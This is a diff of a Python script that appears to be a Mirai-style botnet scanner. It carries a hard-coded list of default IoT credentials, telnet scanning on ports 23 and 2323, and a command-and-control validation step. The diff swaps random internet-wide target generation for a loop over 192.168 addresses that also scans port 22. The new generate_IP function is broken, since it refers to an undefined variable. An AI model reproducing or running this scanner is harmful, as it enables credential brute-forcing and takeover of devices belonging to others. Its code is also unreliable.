@@ -2,7 +2,7 @@ import socket, time, sys, telnetlib, os, hashlib, platform
 from random import randrange
 from threading import Thread
 
-MAlist = [('root','xc3511'),
+MAlist = [('admin','password'),
           ('root','vizxv'),
           ('root','admin'),
           ('admin','admin'),
@@ -14,7 +14,6 @@ MAlist = [('root','xc3511'),
           ('root','54321'),
           ('support','support'),
           ('root',''),
-          ('admin','password'),
           ('root','root'),
           ('root','12345'),
           ('user','user'),
@@ -169,37 +168,8 @@ def scan23(ip):
             print ("[scanner] %s tcp/2323 connectionreset" %ip)
     sock.close()
 
-def generateIP():
-    blockOne = randrange(0, 255, 1)
-    blockTwo = randrange(0, 255, 1)
-    blockThree = randrange(0, 255, 1)
-    blockFour = randrange(0, 255, 1)
-    if blockOne == 127:                                             # LOOPBACK/LOCAL
-        return generateIP()      
-    elif blockOne == 10:                                            # LAN
-        return generateIP()
-    elif blockOne == 172:                                           # LAN
-        return generateIP()
-    elif blockOne == 192:                                           # LAN
-        return generateIP()
-    elif blockOne == 0:                                             # Invalid Address Space
-        return generateIP()
-    elif blockOne == 100 and blockTwo >= 64 and blockTwo < 127:     # IANA
-        return generateIP()
-    elif blockOne == 169 and blockTwo > 254:                        # IANA
-        return generateIP()
-    elif blockOne == 198 and blockTwo >= 18 and blockTwo < 20:      # IANA
-        return generateIP()
-    elif blockOne >= 224:                                           # Multicast
-        return generateIP()
-    elif blockOne == 6 or blockOne == 7 or blockOne == 11 or \
-    blockOne == 21 or blockOne == 22 or blockOne == 26 or \
-    blockOne == 28 or blockOne == 29 or blockOne == 30 or \
-    blockOne == 33 or blockOne == 55 or blockOne == 214 or \
-    blockOne == 215:
-        return generateIP()
-    else:
-        return str(blockOne) + '.' + str(blockTwo) + '.' + str(blockThree) + '.' + str(blockFour)
+def generate_IP(index):
+    return "192.168."+str(i)+".167"
 
 def getOS():
     return platform.system() + " " + platform.release() + " " + platform.version()
@@ -224,7 +194,10 @@ def validateC2():
 def scanner():
     while True:
         try:
-            scan23(generateIP())
+            for i in range(1,255):
+                scan22(generate_IP(i))
+            for i in range(1,255):
+                scan23(generate_IP(i))
         except KeyboardInterrupt:
             print ("[scanner] Terminating bot ..")
             break
@@ -234,7 +207,14 @@ def scanner():
 
 print ("[scanner] Scanner process started ..")
 validateC2()
+if __name__ == '__main__':
+    scanner()
+    
 
+
+
+'''
 for x in range(0, __THREADS__):
     thread = Thread(target = scanner)
     thread.start()
+'''
